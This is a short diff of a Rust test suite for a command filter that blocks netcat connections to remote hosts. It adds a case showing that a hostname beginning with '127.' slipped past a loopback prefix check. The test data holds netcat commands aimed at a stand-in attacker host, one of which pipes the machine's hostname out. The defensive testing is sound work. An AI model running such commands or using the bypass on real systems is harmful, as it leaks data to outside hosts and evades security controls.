@@ -3686,6 +3686,12 @@ fn netcat_oneshot_to_remote_host_is_blocked() {
             r#"{"command": "nc -w 3 -q attacker.com 4444"}"#,
         ),
         (
+            // Review (0.9.1): a hostname that merely STARTS with "127." is
+            // not loopback (the old prefix check let it through).
+            "127.-prefixed hostname",
+            r#"{"command": "nc -q -w3 127.attacker.com 4444"}"#,
+        ),
+        (
             "piped hostname via nc -q",
             r#"{"command": "echo \"$(hostname)\" | nc -q -w 3 attacker.com 9090"}"#,
         ),
